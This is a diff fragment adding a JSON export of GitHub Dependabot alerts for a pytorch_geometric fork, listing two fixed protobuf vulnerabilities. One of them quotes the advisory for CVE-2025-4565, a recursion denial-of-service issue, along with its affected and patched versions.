+                    },
+                    "severity": "high",
+                    "vulnerable_version_range": "< 5.29.6",
+                    "first_patched_version": {
+                        "identifier": "5.29.6"
+                    }
+                }
+            ],
+            "cvss_severities": {
+                "cvss_v3": {
+                    "vector_string": null,
+                    "score": 0.0
+                },
+                "cvss_v4": {
+                    "vector_string": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:L",
+                    "score": 8.2
+                }
+            },
+            "epss": {
+                "percentage": 0.00662,
+                "percentile": 0.48573
+            },
+            "cvss": {
+                "vector_string": null,
+                "score": 0.0
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-674",
+                    "name": "Uncontrolled Recursion"
+                }
+            ],
+            "classification": "general"
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "protobuf"
+            },
+            "severity": "high",
+            "vulnerable_version_range": "< 5.29.6",
+            "first_patched_version": {
+                "identifier": "5.29.6"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/pytorch_geometric/dependabot/alerts/3",
+        "html_url": "https://github.com/fcas/pytorch_geometric/security/dependabot/3",
+        "created_at": "2026-08-14T19:15:17Z",
+        "updated_at": "2026-08-16T01:23:54Z",
+        "dismissal_request": null,
+        "assignees": [],
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": "2026-08-16T01:23:54Z",
+        "auto_dismissed_at": null
+    },
+    {
+        "number": 2,
+        "state": "fixed",
+        "dependency": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "protobuf"
+            },
+            "manifest_path": "uv.lock",
+            "scope": "runtime",
+            "relationship": "direct"
+        },
+        "security_advisory": {
+            "ghsa_id": "GHSA-8qvm-5x2c-j2w7",
+            "cve_id": "CVE-2025-4565",
+            "summary": "protobuf-python has a potential Denial of Service issue",
+            "description": "### Summary\nAny project that uses Protobuf pure-Python backend to parse untrusted Protocol Buffers data containing an arbitrary number of **recursive groups**, **recursive messages** or **a series of [`SGROUP`](https://protobuf.dev/programming-guides/encoding/#groups) tags** can be corrupted by exceeding the Python recursion limit.\n\nReporter: Alexis Challande, Trail of Bits Ecosystem Security Team\n[ecosystem@trailofbits.com](mailto:ecosystem@trailofbits.com)\n\nAffected versions: This issue only affects the [pure-Python implementation](https://github.com/protocolbuffers/protobuf/tree/main/python#implementation-backends) of protobuf-python backend. This is the implementation when `PROTOCOL_BUFFERS_PYTHON_IMPLEMENTATION=python` environment variable is set or the default when protobuf is used from Bazel or pure-Python PyPi wheels. CPython PyPi wheels do not use pure-Python by default.\n\nThis is a Python variant of a [previous issue affecting protobuf-java](https://github.com/protocolbuffers/protobuf/security/advisories/GHSA-735f-pc8j-v9w8).\n\n### Severity\nThis is a potential Denial of Service. Parsing nested protobuf data creates unbounded recursions that can be abused by an attacker.\n\n### Proof of Concept\nFor reproduction details, please refer to the unit tests [decoder_test.py](https://github.com/protocolbuffers/protobuf/blob/main/python/google/protobuf/internal/decoder_test.py#L87-L98) and [message_test](https://github.com/protocolbuffers/protobuf/blob/main/python/google/protobuf/internal/message_test.py#L1436-L1478)\n\n### Remediation and Mitigation\nA mitigation is available now. Please update to the latest available versions of the following packages:\n* protobuf-python(4.25.8, 5.29.5, 6.31.1)",
+            "severity": "high",
+            "identifiers": [
+                {
+                    "value": "GHSA-8qvm-5x2c-j2w7",
+                    "type": "GHSA"
+                },
+                {
+                    "value": "CVE-2025-4565",
+                    "type": "CVE"
+                }
+            ],
+            "references": [
+                {
+                    "url": "https://github.com/protocolbuffers/protobuf/security/advisories/GHSA-735f-pc8j-v9w8"
+                },
+                {
+                    "url": "https://github.com/protocolbuffers/protobuf/security/advisories/GHSA-8qvm-5x2c-j2w7"
+                },
+                {
+                    "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-4565"
+                },
+                {
+                    "url": "https://github.com/protocolbuffers/protobuf/commit/17838beda2943d08b8a9d4df5b68f5f04f26d901"
+                },
+                {
+                    "url": "https://github.com/protocolbuffers/protobuf/blob/main/python/google/protobuf/internal/decoder_test.py#L87-L98"
+                },
+                {
+                    "url": "https://github.com/protocolbuffers/protobuf/blob/main/python/google/protobuf/internal/message_test.py#L1436-L1478"
+                },
+                {
+                    "url": "https://github.com/protocolbuffers/protobuf/tree/main/python#implementation-backends"
+                },
+                {
+                    "url": "https://github.com/advisories/GHSA-8qvm-5x2c-j2w7"
+                }
+            ],
+            "published_at": "2025-06-16T16:02:58Z",
+            "updated_at": "2025-06-16T16:03:02Z",
+            "withdrawn_at": null,
+            "vulnerabilities": [
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "protobuf"
+                    },
+                    "severity": "high",
+                    "vulnerable_version_range": "< 4.25.8",
+                    "first_patched_version": {
+                        "identifier": "4.25.8"
+                    }
+                },
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "protobuf"
+                    },
+                    "severity": "high",
+                    "vulnerable_version_range": ">= 5.26.0rc1, < 5.29.5",
+                    "first_patched_version": {
+                        "identifier": "5.29.5"
+                    }
+                },
+                {
+                    "package": {
+                        "ecosystem": "pip",
+                        "name": "protobuf"
+                    },
+                    "severity": "high",
+                    "vulnerable_version_range": ">= 6.30.0rc1, < 6.31.1",
+                    "first_patched_version": {
+                        "identifier": "6.31.1"
+                    }
+                }
+            ],
+            "cvss_severities": {
+                "cvss_v3": {
+                    "vector_string": null,
+                    "score": 0.0
+                },
+                "cvss_v4": {
+                    "vector_string": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+                    "score": 8.2
+                }
+            },
+            "epss": {
+                "percentage": 0.00251,
+                "percentile": 0.16576
+            },
+            "cvss": {
+                "vector_string": null,
+                "score": 0.0
+            },
+            "cwes": [
+                {
+                    "cwe_id": "CWE-674",
+                    "name": "Uncontrolled Recursion"
+                }
+            ],
+            "classification": "general"
+        },
+        "security_vulnerability": {
+            "package": {
+                "ecosystem": "pip",
+                "name": "protobuf"
+            },
+            "severity": "high",
+            "vulnerable_version_range": "< 4.25.8",
+            "first_patched_version": {
+                "identifier": "4.25.8"
+            }
+        },
+        "url": "https://api.github.com/repos/fcas/pytorch_geometric/dependabot/alerts/2",
+        "html_url": "https://github.com/fcas/pytorch_geometric/security/dependabot/2",
+        "created_at": "2026-08-14T19:15:17Z",
+        "updated_at": "2026-08-16T01:23:54Z",
+        "dismissal_request": null,
+        "assignees": [],
+        "dismissed_at": null,
+        "dismissed_by": null,
+        "dismissed_reason": null,
+        "dismissed_comment": null,
+        "fixed_at": "2026-08-16T01:23:54Z",
+        "auto_dismissed_at": null
+    }
+]
